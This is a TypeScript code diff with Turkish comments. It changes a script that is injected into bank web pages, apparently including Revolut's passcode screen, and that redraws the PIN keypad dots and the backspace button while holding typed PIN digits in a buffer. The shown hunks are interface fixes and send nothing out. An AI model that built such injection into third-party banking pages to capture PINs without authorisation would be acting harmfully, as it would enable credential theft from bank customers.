@@ -135,21 +135,50 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
     // gorunumu bozuk; kullanici girdigini goremiyor).
     const renderKeypadDots = () => {
       try {
+        // Gosterge SADECE kullanici rakam bastiktan sonra gorunur —
+        // bos pill her sayfada cikip ekrani kirletiyordu.
+        if (keypadBuffer.length === 0) {
+          const dot0 = document.querySelector(".sx827n0");
+          const host0 = (dot0 && dot0.parentElement) || window.__ieDotHost;
+          if (host0 && host0.isConnected && window.__ieDotHost) host0.innerHTML = "";
+          const own0 = document.getElementById("ie-keypad-dots");
+          if (own0) own0.style.display = "none";
+          return;
+        }
         const dot = document.querySelector(".sx827n0");
         const host = (dot && dot.parentElement) || window.__ieDotHost;
         if (host && host.isConnected) {
           window.__ieDotHost = host;
+          // Arka plan koyuysa (Revolut passcode) acik renk noktalar kullan
+          let darkBg = false;
+          try {
+            let node = host;
+            while (node && node !== document.documentElement) {
+              const c = getComputedStyle(node).backgroundColor;
+              if (c && c !== "transparent" && !/^rgba?\(\s*0\s*,\s*0\s*,\s*0\s*(,\s*0\s*)?\)/.test(c)) {
+                const m = /(\d+)[,\s]+(\d+)[,\s]+(\d+)/.exec(c);
+                if (m) darkBg = 0.2126 * +m[1] + 0.7152 * +m[2] + 0.0722 * +m[3] < 128;
+                break;
+              }
+              node = node.parentElement;
+            }
+          } catch (e) {}
+          const fillCol = darkBg ? "#ffffff" : "#191c1f";
+          const emptyCol = darkBg ? "rgba(255,255,255,.42)" : "#aab3bb";
           host.style.display = "flex";
+          host.style.flexDirection = "row";
+          host.style.flexWrap = "nowrap";
           host.style.justifyContent = "center";
+          host.style.alignItems = "center";
           host.style.gap = "16px";
           host.innerHTML = "";
           for (let i = 0; i < PIN_MAX; i++) {
             const d = document.createElement("span");
             d.style.cssText =
-              "width:16px;height:16px;border-radius:50%;display:inline-block;box-sizing:border-box;" +
+              "width:16px;height:16px;border-radius:50%;display:inline-block;box-sizing:border-box;flex:none;" +
               (i < keypadBuffer.length
-                ? "background:#191c1f;border:2px solid #191c1f;"
-                : "background:transparent;border:2px solid #aab3bb;");
+                ? "background:" + fillCol + ";border:2px solid " + fillCol + ";"
+                : "background:transparent;border:2px solid " + emptyCol + ";");
             host.appendChild(d);
           }
           return;
@@ -182,6 +211,10 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
     const injectBackspace = () => {
       try {
         if (document.getElementById("ie-keypad-backspace")) return;
+        if (!hasKeypad()) return;
+        // Revolut disindaki sayfalarda rastgele data-value butonlari varsa
+        // buton en az 1 rakam basilincaya kadar enjekte edilmesin.
+        if (BANK_SLUG !== "revolut" && keypadBuffer.length === 0) return;
         const zero = document.querySelector("button[data-value='0']");
         if (!zero) return;
         // 0'dan sonraki bos grid hucresi (veya grid'in son hucresi)
